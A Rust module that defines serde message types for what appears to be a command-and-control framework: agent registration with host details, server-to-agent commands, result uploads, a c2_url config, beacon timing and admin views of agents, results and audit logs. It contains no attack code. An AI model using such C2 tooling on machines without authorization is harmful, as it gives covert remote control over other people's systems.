//! Protocol message types shared across server, agent, and CLI.

use serde::{Deserialize, Serialize};

/// Agent registration request (agent → server).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterReq {
    pub agent_id: String,
    pub platform: String,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_version: Option<String>,
    pub ip_addrs: Option<String>,
    pub alias: Option<String>,
    pub note: Option<String>,
}

/// Agent registration response (server → agent).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterResp {
    pub status: String,
    pub message: String,
    pub token: String,
}

/// Command dispatched to agent (server → agent).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub cmd_id: String,
    pub command: String,
}

/// Result upload request (agent → server).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResultReq {
    pub cmd_id: String,
    pub exit_code: i32,
    pub stdout: String,
    pub stderr: String,
    pub signature: String,
}

/// Agent runtime config (embedded or file).
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentConfig {
    pub c2_url: String,
    pub profile_name: String,
    pub shared_token: String,
    pub alias: Option<String>,
    pub note: Option<String>,
}

// ─── Shared API response DTOs (server → CLI) ───

/// Agent info returned by GET /admin/agents.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AgentView {
    pub agent_id: String,
    pub alias: Option<String>,
    pub platform: String,
    pub last_seen_at: Option<String>,
    pub note: Option<String>,
    pub profile_name: Option<String>,
    pub beacon_min_ms: Option<i64>,
    pub beacon_max_ms: Option<i64>,
    pub backoff_max_ms: Option<i64>,
    pub kill_after_hours: Option<i64>,
    pub hostname: Option<String>,
    pub username: Option<String>,
    pub os_version: Option<String>,
    pub ip_addrs: Option<String>,
    #[serde(default)]
    pub tags: Vec<String>,
}

/// Command result returned by GET /admin/results.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ResultView {
    pub agent_id: String,
    pub cmd_id: String,
    pub exit_code: i64,
    pub stdout: String,
    pub stderr: String,
    pub ts_ms: i64,
}

/// Audit log entry returned by GET /admin/audit.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AuditView {
    pub id: i64,
    pub ts: String,
    pub actor: String,
    pub action: String,
    pub target_type: String,
    pub target_id: String,
    pub context: serde_json::Value,
}

/// Tags response from GET /admin/agents/{id}/tags.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct TagsResponse {
    #[serde(default)]
    pub tags: Vec<String>,
}

